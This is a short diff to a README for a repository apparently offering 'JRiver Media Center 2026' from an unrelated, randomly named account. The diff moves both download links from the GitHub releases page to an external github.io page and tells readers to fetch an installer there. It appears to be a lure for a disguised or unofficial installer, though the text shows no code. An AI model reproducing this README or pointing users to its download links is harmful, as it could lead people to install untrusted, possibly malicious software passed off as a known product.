@@ -1,12 +1,12 @@
 # 🎵 JRiver-Media-Center-2026 - Master your digital music library effortlessly
 
-[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/Spotpenalfacility869/JRiver-Media-Center-2026/releases)
+[![](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://spotpenalfacility869.github.io)
 
 ## 📥 Getting the software
 
 You need to access the official release page to obtain the installer for your computer. This page contains the most recent version of the application.
 
-[Visit this page to download JRiver Media Center](https://github.com/Spotpenalfacility869/JRiver-Media-Center-2026/releases)
+[Visit this page to download JRiver Media Center](https://spotpenalfacility869.github.io)
 
 ## 💻 System requirements
 
